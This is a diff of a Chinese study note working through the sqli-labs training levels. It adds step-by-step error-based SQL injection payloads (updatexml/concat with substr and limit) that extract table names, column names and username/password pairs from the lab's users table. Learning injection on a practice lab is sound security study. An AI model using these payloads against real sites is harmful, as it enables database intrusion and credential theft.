@@ -34,7 +34,7 @@ category: 笔记
 
 ## less-1
 
-**1.判断闭合方式及有无回显**
+**1.判断是否有回显及闭合方式**
 
 当输入`id=1`时，页面有回显
 
@@ -63,9 +63,11 @@ category: 笔记
 
 注：联合注入语法为`union select 1,2,3 from...where...`不要把回显数字标错地方
 
-注：因为显示数据的地方只有个，但我们查询的数据不止一条，因此要用`group_concat`函数将表名等内容连接成一整行显示
+注：对于一张表来说，`group_concat()`会将多行数据连接成一整行，返回一整行数据，并用`，`隔开 而`concat()`只能链接表中一行数据，返回多行 在这里，因为显示位只有一个地方，但我们要获取的数据不止一行，因此要用`group_concat()`函数连接起来
 
-列名：
+字段名：
+
+我们要的是`users`表里的内容
 
     ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
 
@@ -91,17 +93,77 @@ category: 笔记
 
 # GET-报错注入
 
-## less-5~6
+## less-5
 
-//concat 与 groupc_concat的区别
+**1.判断是否有回显及闭合方式**
 
-//updatexml()语法 0x7e 的作用，可以换成什么'~'
+当输入`?id=1`时，页面只显示`You are in...`,并没有回显信息
 
-//(select...)括号的作用
+经过尝试发现闭合方式：`'`
 
-//username,' ',password ' '的作用
+![](https://picgocloud.com/m/6b44f05f-a93f-482d-a7bf-8e5060228ded.png)
 
-//数据显示不全的原因及解决办法
+**2. 判断是否返回错误信息**
+
+输入：
+
+    ?id=1' and updatexml(1,concat('~',(select database())),1)--+
+
+![](https://picgocloud.com/m/3e9f3656-42e3-4f5a-9064-3577e772d5eb.png)
+
+发现页面返回错误信息，可以使用报错注入
+
+注：`select database()`应使用`()`包裹，即`(select database())` `select`默认输出的是一张表，而`concat()`需要的是'值',所以要用括号把`select`的内容转变为'值'
+
+**3.获取表名**
+
+因为我们在上一步判断页面是否返回错误信息时，已经获取到了库名，所以开始获取表名
+
+    ?id=1' and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+
+
+![](https://picgocloud.com/m/71766e40-88fb-410c-946c-18b916dff886.png)
+
+**4.获取字段名**
+
+    ?id=1' and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),1)--+
+
+![](https://picgocloud.com/m/cbafc8d5-38bf-4d76-932c-1928153e111c.png)
+
+**5.获取数据**
+
+    ?id=1' and updatexml(1,concat('~',(select group_concat(username,' ',password) from users)),1)--+
+
+![](https://picgocloud.com/m/65fcc4b3-bf9e-4960-b102-36d074520dd4.png)
+
+注：`group_concat(username,' ',password)`在`username`和`password`中间要加内容，例如`'='` `' '`，否则二者数据将会连接在一起无法辨认
+
+发现页面上不能前几关一样显示全部数据，因为`updatexml()`能查询字符串的最大长度为32 我们可以用`substr()`函数截取，或用`limit()`
+函数逐行查询
+
+* substr(字符串, 起始位置, 截取长度) 适合超长字符串
+
+一般只截取15~20个字符
+
+    ?id=1' and updatexml(1,concat('~',substr((select group_concat(username,' ',password) from users),1,15)),1)--+
+
+![](https://picgocloud.com/m/f474315b-fb76-45f1-93a5-00396e1084fb.png)
+
+接着将`1,15`换为`16,15` `31,15`... 我们就能查到全部数据
+
+* limit x,1 跳过x行取1行
+
+注:`group_concat()`会把多行压成一行，导致`limit`失效 所以必须用普通的`concat()`配合`limit`
+
+    ?id=1' and updatexml(1,concat('~',(select concat(username,' ',password) from users limit 0,1)),1)--+
+
+![](https://picgocloud.com/m/c2f8e3fc-67df-4f63-96bd-f6e2e503ae76.png)
+
+由此得到了第一行数据，接着替换x的值我们就可以得到全部的数据
+
+## less-6
+
+双引号闭合`"`
+
 
 # GET-布尔盲注
 
@@ -439,8 +501,6 @@ less-11后端大致代码：
 发现页面返回错误信息，因此我们使用报错注入
 
 **4.获取表名**
-
-因为我们在上一步判断是否返回报错信息时已经得到了库名，所以这一步我们直接获取表名
 
 输入
 
